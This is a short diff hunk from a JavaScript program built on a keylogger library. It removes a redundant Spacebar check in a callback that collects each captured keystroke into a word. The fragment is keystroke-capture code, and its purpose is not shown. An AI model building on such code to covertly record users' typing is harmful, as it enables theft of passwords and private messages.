@@ -51,7 +51,7 @@ keylogger.start(async (key) => {
 
     if(key != Spacebar){
         if(i==0){
-            if(key!=Tab && key!=Spacebar && key!=Enter && key!=Escape && key!=Shift){
+            if(key!=Tab && key!=Enter && key!=Escape && key!=Shift){
                 word += key
             }
             i=1
